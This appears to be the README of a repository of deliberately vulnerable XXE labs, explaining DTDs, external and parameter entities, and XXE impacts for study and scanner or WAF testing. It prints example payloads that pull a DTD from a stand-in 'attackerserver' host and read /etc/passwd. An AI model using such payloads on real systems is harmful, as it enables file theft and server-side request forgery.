# XXE Study

This repository contains various XXE labs set up for different languages and their different parsers.
This may alternatively serve as a playground to test with Vulnerability scanners / WAF rules / Secure Configuration settings.

## Available environments

| Language | Parser Used                             | App              |
| -------- | --------------------------------------- | ---------------- |
| Python   | eTree / lxml parser ( eTree uses lxml ) | Python-flask-xxe |
| PHP      | DOM parser                              | Php-Haboob-xxe   |
| Java     | JAXB                                    | Java-XXE-JAXB    |

## Quick Start

1. Install docker.
2. Install docker compose.
3. Clone the repository:
   `git clone https://github.com/HLOverflow/XXE-study.git`
4. Visit respective `Apps` directory of interest and run:
   `./start.sh`

## Intro

**What is XXE?**

Definition by OWASP

>  *XML External Entity* attack is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a <u>weakly configured</u> XML parser**. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

source: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

**Why study XXE?**

1. Ranked #4 in OWASP top 10.

   source: https://owasp.org/www-project-top-ten/

2. Ranked #15 as one of the most impactful vulnerabilities reported on HackerOne Bug Bounty Platform.

   source: https://www.hackerone.com/top-10-vulnerabilities

3. XXE's impact can be related to another impactful well-known vulnerability, Server-side Request Forgery (SSRF).

**Some Impact of XXE**

The following impacts can be demonstrated in the XXE lab set up and some examples have been provided in their respective `example` folders.

1. Arbitrary File Read
   1. Data ex-filtration of source codes / configuration files.
2. Server-side Request Forgery
   1. Exposure of internal services.
   2. Enumeration of internal services via "Port scanning".
   3. Stealing of cloud credentials via Meta-data instances.
3. Denial-of-service

## XML Essentials

### Document type definition (DTD)

**What is a DTD?**

> A DTD defines the valid <u>building blocks</u> of an XML document. It defines the document structure with a <u>list of validated elements and attributes</u>

source: https://en.wikipedia.org/wiki/Document_type_definition

**Minimal Syntax**

```xml
<!DOCTYPE rootnode [
	<!ENTITY test "hello world">
	<!ENTITY test2 "hello world2">
]>
<sample> &test; &test2;</sample>
```

Note: It has to be defined before any XML document node begin. This means that when exploiting XXE, we cannot inject a DTD in the middle of an XML. The syntax is also case-sensitive.

### ENTITY

1. **Internal Entity**

   Definition:

   ```xml-dtd
   <!ENTITY entityname "Hello">
   <!ENTITY entityname2 'World'>
   ```

   Usage:

   ```xml
   <sample>I would like to say &entityname; &entityname2;</sample>
   ```

2. **External Entity**

   Definition:

   ```xml-dtd
   <!ENTITY includeme SYSTEM "include.xml">
   <!ENTITY includeme2 SYSTEM "http://attackerserver/include.xml">
   ```

   Usage:

   ```xml
   <sample>
       <head>Header</head>
       <first>&includeme;</first>
       <second>&includeme2;</second>
   </sample>
   ```

3. **Parameter Entity**

   This particular entity is confusing. You may think of this as an entity whose value defines another definition.

   1. **Internal definition**

      Definition:

      ```xml-dtd
      <!ENTITY % param1 "<!ENTITY variable1 'hello world'>">
      ```

      Usage:

      Parameter entities are used **exclusively** within DTDs. They cannot be used directly within XML document. 

      ```xml-dtd
      <!ENTITY % param1 "<!ENTITY variable 'hello world'>">
      %param1;
      <!ENTITY trigger1 "I would like to say &variable; again.">
      ```

      The above definition would expand to the following during run-time:

      ```xml-dtd
      <!ENTITY % param1 "<!ENTITY variable 'hello world'>">
      <!ENTITY variable 'hello world'>
      <!ENTITY trigger1 "I would like to say &variable; again.">
      ```

      2 different usage within the document:

      ```xml
      <sample>
          <first>I would like to say &variable;</first>
          <second>&trigger1;</second>
      </sample>
      ```

   2. **External definition**

      External DTD file:

      ```dtd
      <!ENTITY callme SYSTEM "/etc/passwd">
      ```

      Definition:

      ```xml-dtd
      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
      %param1;
      ```

      The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:

      ```xml-dtd
      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
      <!ENTITY callme SYSTEM "/etc/passwd">
      ```

      Vulnerable call from original XML:

      ```xml
      <sample>&callme;</sample>
      ```

## Great Works by Others

### More Open-source Labs

1. [c0ny1/xxe-lab](https://github.com/c0ny1/xxe-lab): A similar repository in chinese.
2. [jbarone/xxelab](https://github.com/jbarone/xxelab): PHP application with python XXE shell

### Some Blogs on XXE

1. [DepthSecurity: Exploitation](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection): Exploitation technique for PHP web.

### Payload Cheatsheets

1. [PayloadsAllTheThings/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection): List of payloads to experiment on.